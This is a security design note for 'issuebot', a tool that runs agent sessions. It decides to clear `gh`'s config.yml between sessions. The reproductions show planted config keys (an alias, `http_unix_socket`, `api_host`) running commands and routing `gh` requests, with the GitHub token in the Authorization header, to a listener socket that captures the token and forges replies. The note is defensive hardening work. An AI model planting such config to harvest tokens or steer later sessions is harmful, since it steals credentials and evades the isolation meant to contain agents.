# `gh`'s config file does not carry between sessions either

Date: 2026-09-22
Status: implemented
Issue: #173 (related to #151, #171, #137, #101, #75)

## Problem

#151 swept `~/.gitconfig`, `~/.config/git/config` and `~/.ssh/config` out of the session
account's home: the config a *tool* the session runs reads there, each of which can name a
command. `~/.config/gh/config.yml` is the same shape for `gh`, and #151 left it off
deliberately, recording the reasoning under its Residuals and filing this issue for the
decision. Two things make it worth its own issue rather than a one-line addition:

- **The reasoning against it was specific, and has to be answered rather than skipped.** #151
  measured that the file's command-bearing key is `aliases:`; that an alias *does* run a shell
  command; and that it *cannot* shadow a core command. issuebot and a session alike invoke core
  commands (`gh repo clone`, `gh issue edit`, `gh api`), so a plant fires only if some later
  session happens to invoke the invented subcommand name the plant chose -- where git's
  `core.pager` or `credential.helper` fire on an ordinary command. Narrower, and #151 judged it
  too narrow to spend an entry on.

- **#151 also *pinned* `~/.config/gh` as a survivor.** `hosts.yml` beside it is credential
  state, and a test, the image's CI step and both prose documents assert it is still there
  after a sweep. So this is a file-level decision and not a directory-level one, and whatever
  is decided has to keep that invariant.

## Reproduction

All of it against `gh version 2.100.0 (2026-09-03)`, the `gh` in this environment, with a
throwaway `HOME`. #151's two measurements both still hold:

```text
$ HOME=/tmp/repro173/home gh pwn            # aliases: { pwn: '!echo GH-ALIAS-RAN' }
GH-ALIAS-RAN
$ HOME=/tmp/repro173/home gh issue          # aliases: { issue: '!echo GH-CORE-SHADOWED' }
Work with GitHub issues.
```

## The decision the issue asks for: swept

**The alias key is not the worst key in the file, and that is what settles it.** `gh config
list` prints the thirteen keys `gh` respects, and `http_unix_socket` is one of them. Planted in
`config.yml` it re-points `gh`'s HTTP transport at a unix socket of the session's choosing --
and unlike an alias it fires on an **ordinary core command**, which is the exact property #151
rested "not swept" on.

```text
$ cat ~/.config/gh/config.yml
version: "1"
http_unix_socket: /tmp/repro173f/pwn.sock
$ HOME=... GH_TOKEN=ghp_SENTINELTOKEN0123456789012345678901 gh api user
{"login":"forged"}
$ head -6 captured.txt                      # what the listener on that socket received
GET /user HTTP/1.1
Host: api.github.com
User-Agent: GitHub CLI 2.100.0 Agent/claude-code_2-1-263_agent
Accept: */*
Authorization: token ghp_SENTINELTOKEN0123456789012345678901
Content-Type: application/json; charset=utf-8
```

(The `Agent/...` suffix is this session's own harness announcing itself through `gh`, not
something issuebot sets; the capture is quoted as it came back rather than tidied.)

Three harms on that one ordinary command, and each is a different boundary:

- **The token is handed over.** `GH_TOKEN` is in every session's environment and every hook's,
  and it reaches the listener in the `Authorization` header verbatim.
- **The answer is forged.** Whatever the session's `gh` is asked, the listener decides what
  comes back -- `{"login": "forged"}` above. Worth being exact about the reach: this is *not*
  `GhCliAdapter.own_login()` and so not #77's provenance rule, because `GhRunner`
  (`src/issuebot/github/runner.py`) spawns `gh` from the **worker** process with the worker's
  own `HOME`, which no session can write. What it is, is every `gh` the session or a hook runs
  -- and the clone, below.
- **Nothing on the network path sees it.** #126 bounds egress by giving the worker `internal`
  networks alone and an allow-listing `CONNECT` proxy; a unix socket is not a route, so the
  proxy is not bypassed so much as never consulted.

And it reaches issuebot's own work rather than only a later session's, which is what makes
the entry worth having whatever a session does with its own `gh`. `gh repo clone` -- the
worker's clone of the target repository, which under `agent.run_as` runs through `RunAs` at the
session's uid (`WorkspaceManager._clone`) -- went through the planted socket carrying the
token, and its answer is the listener's too:

```text
$ HOME=... GH_TOKEN=ghp_SENTINELTOKEN... gh repo clone jleavers/issuebot /tmp/.../clone
HTTP 404: 404 Not Found (https://api.github.com/graphql)
$ head -6 captured2.txt
POST /graphql HTTP/1.1
Host: api.github.com
Authorization: token ghp_SENTINELTOKEN0123456789012345678901
```

So the channel is not narrower than git's after all. It is `credential.helper`'s shape exactly:
fires on an ordinary command, and what it gets is the credential.

Whether an *exfiltrating* listener is running is the concurrency question #101, #137 and #151
all record, and the answer is the deployment's route (#121): with one account for the
deployment, a session running beside this one can plant the file and listen on the socket at
the same time. With a pool the planting session's listener dies with it, and what the next
session bound to that account inherits is a `gh` whose every call fails to connect -- a plant
that costs it every GitHub operation instead of the token. Both are worth the entry, and
neither depends on the alias channel #151 measured.

## Weighed against a hook's legitimate `gh config set`

This is the argument #151 named for filing it rather than folding it in: `config.yml` is the
file `gh config set` writes, so taking it is a decision about what a hook may configure. Read
against the respected-key list, there is nothing there to lose.

| Key | What a hook would get |
|---|---|
| `pager`, `prompt` | Already fixed and protected: `GH_PAGER=cat` and `GH_PROMPT_DISABLED=1` are in `FIXED_ENVIRONMENT`, which `.issuebot/env` cannot override |
| `editor`, `browser` | Under `TOOL_CONFIG_ENV_PREFIXES`' `GH_` since #171, and named there for this reason |
| `http_unix_socket` | The channel above |
| `aliases` | The channel #151 measured -- and not writable by `gh config set` at all (below) |
| `git_protocol`, `color_labels`, `accessible_colors`, `accessible_prompter`, `spinner`, `prefer_editor_prompt`, `telemetry` | Inert: presentation and protocol preferences that name no command and re-point nothing |
| `api_host` | Per-host, and so **not in this file at all** -- it lives in `hosts.yml`, which this change keeps. A residual, below |

`aliases` is worth stating separately, because "the file `gh config set` writes" is what made
the trade sound even. It is not on `gh config list` at all, and `gh config set` cannot plant
one:

```text
$ gh config set aliases.pwn '!echo x'
! warning: 'aliases.pwn' is not a known configuration key
```

-- and it writes a dead top-level `aliases.pwn:` key rather than an entry under `aliases:`.
(The file it writes does carry an `aliases:` map, `gh`'s own default `co: pr checkout`; the
point is that `gh config set` cannot put anything in it.) The alias channel is `gh alias set`'s,
a different command writing the same file. So the command the argument is about and the channel
the issue is about do not meet.

## And the cost is nil, which is the other half

`gh` needs no `config.yml`. With an empty home it creates none and does not care:

```text
$ HOME=/tmp/empty gh --version >/dev/null; ls /tmp/empty/.config/gh
ls: cannot access '/tmp/empty/.config/gh': No such file or directory
$ HOME=/tmp/empty gh config get pager; echo "exit=$?"
exit=0
```

and it writes one when it next has config of its own to write -- the multi-account migration
of a `hosts.yml` beside it does exactly that, which is where the `version: "1"` below comes
from:

```text
$ ls ~/.config/gh                 # config.yml removed, hosts.yml left
hosts.yml
$ HOME=... gh pwn
unknown command "pwn" for "gh"
$ ls ~/.config/gh
config.yml  hosts.yml
$ cat ~/.config/gh/config.yml
version: "1"
```

So nothing has to be put back by hand, and a hook's `gh config set` still configures the `gh`
in its own shell; what it no longer does is hand a setting to the *next* session, which is the same line
#171 drew for the same two tools' environment variables. `gh` has no `/etc` file to point a
deployment at the way git has `/etc/gitconfig`, and needs none: everything a deployment
legitimately sets is in the table above, already answered by the protected environment.

## Design

- **A fourth entry in `TOOL_CONFIG_SWEEP`** (`agent/runas.py`): `(".config", "gh",
  "config.yml")`. Path components like the other three and for the same reason -- `_walk`
  resolves one at a time and yields the first symlink it meets, so a `.config` or a
  `.config/gh` replaced by a link is unlinked as the plant it is rather than stepped through.
  No new setting and no image change: `_sweep` already runs before every turn and before every
  script that opens a login shell (#137). One new call site, which is the next bullet.

- **The clone is swept too** (`WorkspaceManager._clone`), which is not a change to the list
  but to when it runs, and without it the entry above would not have delivered. The sweep ran
  before every turn and before every *script* (`_run_script`: the four hooks and the post-clone
  setup), on #137's reasoning that what needed protecting was the login shell and that
  `_run_argv`'s other caller, the clone, was "`gh` as an argv and reads no start-up file". True
  of #137's list and false of #151's and this one: `gh repo clone` reads
  `~/.config/gh/config.yml`, and it shells out to `git clone`, which reads `~/.gitconfig`. And
  the clone is the *earliest* thing a run does at that uid -- ahead of the post-clone setup,
  whose sweep CLAUDE.md calls the load-bearing one under a pool. So a plant the previous
  session at this account left was live for exactly one command, and it was the one carrying
  `GH_TOKEN` and writing the tree the session then works in: the command this spec's own
  evidence uses. Two call sites rather than one seam in `_run_argv`, because the ordering test
  in `tests/test_agent_session.py` records a spawn by wrapping `_run_argv`, so a sweep inside
  it would no longer be observably *before* the thing it protects -- the very regression that
  test exists to catch. The drift risk two call sites carry is answered by pinning the second
  one (`test_the_clone_is_swept_before_it_runs`).

- **`hosts.yml` stays, and so does `~/.config/gh`.** The invariant #151 pinned, kept for the
  reason it was pinned: a credential authenticates the next session rather than steering it,
  which is the line `.claude/.credentials.json` already sits on. Still a denylist, still files
  and never a directory.

## Residuals

- **`api_host` in the `hosts.yml` this change keeps**, which is the residual the decision
  creates rather than one it inherits, so it is named here first. `gh config set -h <host>`
  writes into `hosts.yml`, not `config.yml`, and the `api_host` it can carry re-points `gh`'s
  API host on an ordinary command -- measured in the exact post-sweep state, no `config.yml`
  anywhere:

  ```text
  $ cat ~/.config/gh/hosts.yml
  github.com:
      oauth_token: not-a-real-token
      user: nobody
      api_host: 127.0.0.1:8099
  $ HOME=... GH_TOKEN=ghp_SENTINEL... gh api user
  Get "https://127.0.0.1:8099/user": http: server gave HTTP response to HTTPS client
  ```

  So the property the decision above rests on -- fires on an ordinary core command -- is true
  of a key in the file that survives. Three things make it a residual rather than a fifth
  entry, and the first is the one that settles it:

  - **`hosts.yml` surviving *is* the acceptance bar for this issue.** Taking it would be a
    different decision, about credential state, and would break the invariant #151 pinned.
  - **It is an ordinary HTTPS request to a name.** #126's `internal` networks and the
    allow-listing `CONNECT` proxy therefore do see it and refuse a name off the list, which is
    the exact opposite of `http_unix_socket`, where no route exists for the proxy to sit on.
    And a session cannot present a certificate the client will trust for a name it does not
    own. That is what makes it materially weaker than the channel that settled the decision.
  - **`gh` validates it.** `gh repo clone` refuses an `api_host` carrying a scheme or a port
    outright (`must be a hostname without a scheme or port`), so the two paths do not even
    agree on what the key accepts.

  Filed as #190 rather than folded in, for the reason #151 filed this one: what to do about a
  command-bearing key inside credential state is a decision of its own, and a key-level edit of
  a credential file is a different shape from the path-level denylist this list is.

  Not measured either way, and worth naming with it: host-level `pager`, `editor` and `browser`
  also survive in `hosts.yml` and read back under `gh config get -h <host>`, while the
  hostname-less lookup that `gh`'s own pager and editor resolution uses returns empty. Probably
  inert; no offline `gh` command that pages was found to close it.

- **A sweep that fails before the clone.** `sweep_agent_home` is best effort everywhere -- it
  logs `claude_home_sweep_failed` at WARNING and returns -- and `_clone` does not check it, so
  the clone runs anyway. Everywhere else that is answered by the next sweep; here it is not,
  because the command being protected is the very next one. Failing the clone closed is a
  clean exit (`create_or_reuse`'s `except AgentError` already removes the workspace), but it
  trades a run lost to a transient `sudo` for a plant nobody has evidence of, which is a
  decision about availability rather than about this list. Named here; the warning immediately
  before a clone is the one an operator should read as serious.

- **`GH_CONFIG_DIR`**, which outranks `XDG_CONFIG_HOME` for `gh` and would move this file
  somewhere the list does not name. Closed already, and by the environment half rather than by
  this list: it is under `TOOL_CONFIG_ENV_PREFIXES`' `GH_` (#171), so `.issuebot/env` cannot
  set it, and it is not in `PASSTHROUGH_NAMES`, so it is not inherited from the worker. Named
  here because a reader of this list will wonder, not because it is open.

- **`gh` extensions** (`~/.local/share/gh/`), which are executables rather than config and
  which `gh <ext>` runs by the same invented-subcommand route the alias channel has. Not
  looked at here, and not this list's to close: the sweep names config files a tool *reads*,
  and an extension directory is a different question with a different answer -- and one where
  "what a deployment legitimately puts there" has a real answer, unlike `config.yml`. Filed as
  #186 rather than folded in, and closed by it: `TOOL_EXTENSION_SWEEP`
  (`2026-09-22-session-gh-extension-design.md`) is a list of its own beside this one, and #191
  protected `XDG_DATA_HOME` in `.issuebot/env` as #171 protected `GH_CONFIG_DIR` for this file.
  It weighed the deployment's answer the way this note asked and landed on the `PATH` route,
  `gh` having no system-wide extension location.

- **Concurrency**, as in #101, #137 and #151: with one account for the deployment a session
  running beside this one can plant between a sweep and the command it protects. A pool closes
  it, since no two concurrent sessions share a home.

## Tests

`tests/test_agent_runas.py`: the fourth entry is pinned beside the other three, with
`(".config", "gh")` and `(".config", "gh", "hosts.yml")` pinned as *not* on the list, so
taking the directory or the credential would be a deliberate edit; `_plant_home` plants a
`config.yml` carrying both channels, so the tests that build their home from it -- the
mode-locked plant and the neighbours -- cover it (the symlink tests build homes of their own
and do not, which costs nothing: `_walk` is generic, and `.config/git` already exercises a
link at the same depth); and two end-to-end proofs through the
real wrapper, the real hook path, the real `bash -lc` and the real `gh`, with only sudo a
fake, each two-sided so it cannot pass against a `gh` that was never going to read the file:
a planted alias does not run for the next session **while `~/.config/gh/hosts.yml` survives**,
which is the invariant #151 pinned; and a planted `http_unix_socket` does not resolve for the
next session's `gh`, asked hermetically through `gh config get`, which reads the key and
touches no socket and no network.

`tests/test_image_layout.py` pins the image's CI step, which proves the same shape against the
image's own `gh` beside the git and profile halves. That step asks that the *plant* is gone
rather than that the file is -- `gh` recreates it, and the step's own `gh pwn` runs are
invocations that would.
